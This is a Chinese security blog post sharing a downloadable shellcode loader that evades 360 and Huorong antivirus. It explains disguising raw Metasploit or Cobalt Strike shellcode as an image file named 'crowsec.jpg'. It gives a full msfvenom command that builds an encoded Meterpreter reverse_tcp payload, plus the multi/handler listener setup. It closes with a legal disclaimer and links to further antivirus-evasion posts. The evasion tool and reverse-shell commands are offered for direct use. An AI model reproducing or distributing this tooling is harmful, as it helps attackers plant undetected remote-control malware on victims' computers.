> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PK53c-Fgay8-2i6co_a7GA)

 ![](http://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1A9eSovMjmg3vTs8uzRyicthuDpqskG1VEM5oAZ0VEFs822aickkgVrKyN4domWdEoxg7Z2OlkoWRVg/0?wx_fmt=png) ** 乌鸦安全 ** 专注于网络安全技术分享，红蓝对抗技术、免杀、反制、内网漫游、安全研究。 69篇原创内容   公众号

✎ 阅读须知

  

  

乌鸦安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。

乌鸦安全拥有对此文章的修改、删除和解释权限，如转载或传播此文章，需保证文章的完整性，未经允许，禁止转载！

本文所提供的工具仅用于学习，禁止用于其他，请在24小时内删除工具文件！！！

  

【工具分享】免杀360&火绒的shellcode加载器
===========================

1. 免杀效果
=======

该`shellcode`加载器目前可以过`360&火绒`，`Windows Defender`没戏。。。

代码和思路暂不开源！

你可以在我的GitHub上下载该工具：https://github.com/crow821/crowsec/tree/master/BypassAV_360_huornog

如果你访问GitHub困难，你可以在乌鸦安全公众号后台直接回复关键字：加载器 下载！

方法：生成`msf`或`cs`的`shellcode`原生格式，命名为`crowsec.jpg`（这个是写死的），将其和`crowsec_shelllcodeBypass.exe`（这个名字可以修改的）放在一个目录下，直接双击即可！

1.1 当前
------

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIsJzp8yFCHXNYMnHTibKxHp79Mp4cclq0djIDxNUn88sXzDicRD9uy49JA/640?wx_fmt=png)

1.2 半年前
-------

这个数据已没有意义。

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIsEOGYuT8eibXhegicNQwoDs0OzjPM6rAXXtJnSO86tibibibSSV5yL4GSAibA/640?wx_fmt=png)

  

这个`shellcode`加载器工具是我在`2021-06-21`号做的，优化之后VT查杀为`0/68`，一个月之后我再去检查，甚至到现在去检查，当前的VT查杀依旧为`0/68`。  

`2021-06-21`是能过`火绒`、`360`、`Windows Defender(关闭自动发送可疑样本)`

前几天在测试的时候，发现过不了`Windows Defender`，今天稍微优化了一下，发现还是过不了`Windows Defender`，主要原因是识别了`msf`的部分特征！！！

鉴于目前已经有了其他的免杀方案，所以在这里就把工具分享出来（🐶），至少还能过`360`和`火绒`。（放出来之后，基本上几小时就没用了，所以仅供参考！）。

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIscIzriaVmLUEOhfzlU2PgmPNKsS6eLmFsAoht9HflOGZTHFKzn33docg/640?wx_fmt=png)

  

查询时间：`2022.01.19`

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIsz1GeNxHWjNwaRFwwUsaRicvUtiafA3ceo64RIqYvBBIZL9ufzk0rg8zg/640?wx_fmt=png)

  

3. 使用方法
=======

3.1. msf上线
==========

在这里使用`msfvenon`生成`shellcode`，为了好点的效果，这里使用`shikata_ga_nai` 编码器器对`shellcode`进行混淆编码，编码之后的`shellcode`并不是所有杀软都识别不出来，详情可以看我以前的文章： 

[老树开新花之shellcode_launcher免杀Windows Defender](http://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647780638&idx=1&sn=2a0cb156ebe729c47f753facbd975c55&chksm=f35fb6e2c4283ff4178a74525ec4ddb545288f998267a623069e81341bf8964fa52c89161384&scene=21#wechat_redirect)
===================================================================================================================================================================================================================================================================

  

```
 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 7 -b '\x00'  lhost=10.211.55.2 lport=1234  -f raw -o crowsec.jpg
```

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIsqKic18CLwkpTETaMjHbyHpR8TnxxmxOesBpjJicvKhgKyH5hKqCsx3BQ/640?wx_fmt=png "null")  

使用msf进行监听：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIsOibD60fB2INlOBiaeZ8SIptlvOnrQia4B91G31pgMxCMu50QV296oENzQ/640?wx_fmt=png "null")  

```
msf6 > use exploit/multi/handler  
[*] Using configured payload generic/shell_reverse_tcp  
msf6 exploit(multi/handler) > set payload  windows/meterpreter/reverse_tcp  
payload => windows/meterpreter/reverse_tcp  
msf6 exploit(multi/handler) > set LHOST 0.0.0.0  
LHOST => 0.0.0.0  
msf6 exploit(multi/handler) > set LPORT 1234  
LPORT => 1234  
msf6 exploit(multi/handler) > run  
  
[*] Started reverse TCP handler on 0.0.0.0:1234
```

### 3.1.1 360

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIs3iaR1ZbnVybOz3axYVzkrAUic6bhrxBvHUwp6crKtib4SQdvhG5wFUGvQ/640?wx_fmt=png "null")i

### 3.1.2 Windows Defender

被杀

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIsJHOFhtvnVib9oMjHmKZd1Wcgc1icyAjq5lHibArNTErhFeJ1FNsTdB9Dg/640?wx_fmt=png "null")  

### 3.1.3 火绒

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIsYVlbSkBVTAT151l5AGuLfUJqFDEC5qVicrzUCbVMichIqG911g1S0tzw/640?wx_fmt=png "null")  

3.2 Cobalt Strike上线
-------------------

在这里只说思路，能够过`火绒`和`360`，但是不能过`Windows Defender`，同样的问题：特征出现在`shellcode`上面。

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIsqwjB1X8Sfvlkic4hrc2vWR94ic5mibibBia1sSy3qSibeTibNpIMqVSEvq5iaA/640?wx_fmt=png "null")  
![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIsHwOVicN1smdO4LAqBmSibeXOIZfHXia5JLBeb4PfAOk3Ue9Zb3ycQ6nZw/640?wx_fmt=png "null")  

将文件保存为`crowsec.jpg`（下图是一个示例，主要是太累了，不想换了。。。）

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIsAbBYpXKB1EulmpFNian0y9FugVexu9pWKUP3KpNlIWgM7YMj3mwibEzw/640?wx_fmt=png "null")image.png

现将生成的bin文件修改为png文件，然后双击上线操作

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BAmuK2kEyc0PUG5RL75gIswFFBxkYib6ZIhoqsiccS18c54czUxUBc1Du8micibz6xPohKSjghViaqDNQ/640?wx_fmt=png "null")  

但是这里可以发现，当前的`payload`已经被标记特征，直接被杀，但是免杀`360`和`火绒`是不影响的。

往期推荐

  

  

[

老树开新花之shellcode_launcher免杀Windows Defender



](https://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647780638&idx=1&sn=2a0cb156ebe729c47f753facbd975c55&chksm=f35fb6e2c4283ff4178a74525ec4ddb545288f998267a623069e81341bf8964fa52c89161384&scene=21#wechat_redirect)

[

自写go加载器加壳免杀——过国内主流杀软



](https://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647777393&idx=1&sn=1327f9907c73373f3354bebb8332fda2&chksm=f35fbb8dc428329b417500ede2787974cba873954cca9d42043b4349c4a5791ab411e532ebb4&scene=21#wechat_redirect)

[

PowerShell随机免杀结合ps2exe上线



](https://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647777954&idx=1&sn=3ea019ff1e450ba8b215c3494a3291cc&chksm=f35fb95ec42830486255da84191e7661e2ddc6cc7e7a7fd93756f4ce42c22a17ab2ccbe40cc9&scene=21#wechat_redirect)

[

pyinstaller打包exe免杀和逆向浅析



](https://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647778187&idx=1&sn=f0f5b0b86d70f9305db29dd25e9658da&chksm=f35fb877c4283161f5c342f36298b0ff4dd93faa577e5dc9b2df50507a57554b5da58a54ff83&scene=21#wechat_redirect)

[

upx加壳过360



](https://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647776904&idx=1&sn=a1bb94fe9ad9bf0caefd4bd12f31c97c&chksm=f35f8574c4280c62a9531b7c3a04d3dc249fe92f388d1149891bdd58c399af71190a37401518&scene=21#wechat_redirect)

[

go加壳分离免杀过国内主流杀软



](https://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647776796&idx=1&sn=f055c1dda25319efc88ed29a853f5ff0&chksm=f35f85e0c4280cf697993c93d7f57e9c0cb0d0b2f11c1ad70f677a32514a58f02354964883eb&scene=21#wechat_redirect)

[

[文末抽奖] 免杀：GO实现shellcode加载器过360



](https://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647775909&idx=1&sn=ee1832c47b7c84e91b388e635dc95fbc&chksm=f35f8159c428084f92ddf6c4bea146498de3382eb6d87820dc7ece4af2a5ab935d00a3d428ac&scene=21#wechat_redirect)

[

pyinstaller打包逆向分析，顺便免杀Windows Defender



](https://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647774539&idx=1&sn=0e10a31f7f3a38f56421f129b95fc588&chksm=f35f8eb7c42807a1b070c874ee29d7c0be0c2ec91c25c92fbd8ecacdde6c2eea1fc1a32d235d&scene=21#wechat_redirect)

  

tips：加我wx，拉你入群，一起学习

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJOca699BJK50FDxBNnhRZrS1hyXb2K4AkLTYfJwticmyHQxv3X6vZHfQ/640?wx_fmt=jpeg)

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/7PuqRWWU6zPRMxSeBfjvKhbuTlWQcqk8L2ib8dROI0fFTknJfEctspUxmbxZwkvG9214pibCEmGWsuEDvDad20tA/640?wx_fmt=png)  

  

新书推荐

![](https://mmbiz.qpic.cn/mmbiz_png/US10Gcd0tQGCeAxCpwiafHPCQ59GvHz6giandwhxYRRbpy9Fg4r24n3DUppDIuN9AdtiaAYaIEm15OGhIfuv6Mzkg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/TN05MmJLxMrNiboff6rhmPUYUNXdWTXZfiaHXPuUGqmPZtqhI6NtGicPMIu6ohOCReWY2C4YZY4AIchDMyal6KWQw/640?wx_fmt=gif)

    过去网络安全距离我们很远，只要没有被攻击便可以忽略，而现在如果存在安全漏洞且一不小心被成功攻击，就可能导致很多公司财务等重要数据被勒索病毒感染，造成巨大经济损失！近几年来，国家展开了护网行动，加上各种机构经常组织CTF比赛等，网络安全越来越火，人才缺口也越来越大。“会渗透，是懂安全的基础；会漏扫，是懂渗透的基础；去实战，是检验能力的标准”此书可以给网络安全领域的专业人士或想入门的人士答疑解惑，是您必不可少的一本专业图书!  

本书从网络攻防实战的角度，对Web漏洞扫描利用及防御进行全面系统的研究，由浅入深地介绍了在渗透过程中如何对Web漏洞进行扫描、利用分析及防御，以及在漏洞扫描及利用过程中需要了解和掌握的基础技术。

全书共分10章，包括漏洞扫描必备基础知识、域名信息收集、端口扫描、指纹信息收集与目录扫描、Web漏洞扫描、Web常见漏洞分析与利用、密码扫描及暴力破解、手工代码审计利用与漏洞挖掘、自动化的漏洞挖掘和利用、Web漏洞扫描安全防御，基本涵盖了Web漏洞攻防技术体系的全部内容。书中还以一些典型漏洞进行扫描利用及实战，通过漏洞扫描利用来还原攻击过程，从而可以针对性地进行防御。

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1Ar5g2WODbmaxTd6ibMYtwZic1LzLS237GhaxAibBnqGmGrdX179RxtibyB5EvFicExia0WUON3sd2tOJxA/640?wx_fmt=jpeg)

  

  

点击上方链接，更多优惠等你哦~

  

![](https://mmbiz.qpic.cn/mmbiz_png/CibE0jlnugbX5SLGI9312kOrkH7gXIN5NPic75bQ8WbAFMEqvZiaQ0WSk4W9eYUfJJRzlMgibjic8mIGicMvjialoDgmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJkslQQ2B5nDuKBlpbKHHtME5RBrJsYucDbPWpyglY02yicRq93PTWn7w/640?wx_fmt=jpeg)

扫取二维码获取

更多精彩

乌鸦安全

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Bt3mgRlo88wGCQuAJ2kv0pzM18jFmpv4CJEBMNAicGSSvDlWSN6DG5JJ0Q8EI6oEuaZS0QNyAojYw/640?wx_fmt=gif)